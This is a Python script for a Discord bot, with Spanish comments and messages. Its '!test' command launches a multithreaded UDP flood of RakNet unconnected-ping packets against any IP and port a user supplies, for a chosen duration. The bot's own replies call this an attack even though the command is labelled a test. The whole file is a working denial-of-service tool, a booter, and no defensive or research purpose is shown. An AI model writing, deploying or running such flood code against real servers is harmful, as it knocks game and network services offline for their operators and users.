import discord
from discord.ext import commands
import socket
import time
import asyncio
import threading
import os

# Leer o pedir el token y guardarlo en token.txt
TOKEN_FILE = "token.txt"
if os.path.isfile(TOKEN_FILE):
    with open(TOKEN_FILE, "r") as f:
        TOKEN = f.read().strip()
else:
    import getpass
    TOKEN = getpass.getpass("Introduce el token de tu bot de Discord: ")
    with open(TOKEN_FILE, "w") as f:
        f.write(TOKEN.strip())

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

attack_in_progress = False
last_attack_time = 0
cooldown_seconds = 10
current_attack_stop_event = None

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user.name}')

@bot.command(name='ayuda')
async def ayuda(ctx):
    help_text = (
        "**Comandos disponibles:**\n"
        "- `!ayuda`\n"
        "- `!methods`\n"
        "- `!stop`"
    )
    await ctx.send(content=help_text)

@bot.command(name='methods')
async def methods(ctx):
    methods_text = (
        "**Métodos de test disponibles:**\n"
        "- `!test <ip> <port> <threads> <time>`"
    )
    await ctx.send(methods_text)

# ------------------ RAKNET ONLY ------------------
class RaknetFlood:
    def __init__(self, ip, port, threads, stop_event=None):
        self.ip = ip
        self.port = port
        self.threads = threads
        self.on = False
        self.stop_event = stop_event

    def flood(self, duration):
        self.on = True
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send, daemon=True)
            t.start()
            threads.append(t)
        end_time = time.time() + duration
        try:
            while time.time() < end_time and self.on:
                if self.stop_event and self.stop_event.is_set():
                    break
                time.sleep(0.1)
            self.stop()
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            if self.stop_event and self.stop_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # RakNet Unconnected Ping packet: 0x01 + 8 bytes random + 16 bytes magic
                packet = b'\x01' + os.urandom(8) + b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
                s.sendto(packet, (self.ip, self.port))
                s.close()
            except Exception:
                pass

@bot.command(name='test')
async def raknet(ctx, ip: str, port: int, threads: int, tiempo: int):
    global attack_in_progress, last_attack_time, current_attack_stop_event
    if attack_in_progress:
        await ctx.send("Ya hay un ataque en curso")
        return
    if time.time() - last_attack_time < cooldown_seconds:
        await ctx.send(f"Debes esperar {int(cooldown_seconds - (time.time() - last_attack_time))} segundos antes de lanzar otro ataque")
        return
    attack_in_progress = True
    current_attack_stop_event = threading.Event()
    await ctx.send(f"Atacando a {ip}:{port} {threads} {tiempo}")
    try:
        raknetter = RaknetFlood(ip, port, threads, stop_event=current_attack_stop_event)
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, raknetter.flood, tiempo)
        await ctx.send(f"Test finalizado")
    except Exception as e:
        await ctx.send(f"Error al ejecutar el test: {e}")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()
        current_attack_stop_event = None

@raknet.error
async def raknet_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Uso correcto: `!test <ip> <port> <threads> <time>`")
    else:
        await ctx.send(f"Ocurrió un error: {error}")

@bot.command(name='stop')
async def stop(ctx):
    global attack_in_progress, current_attack_stop_event
    if attack_in_progress and current_attack_stop_event:
        current_attack_stop_event.set()
        await ctx.send("Todos los ataques han sido detenidos")
    else:
        await ctx.send("No hay ataques para detener")

bot.run(TOKEN)
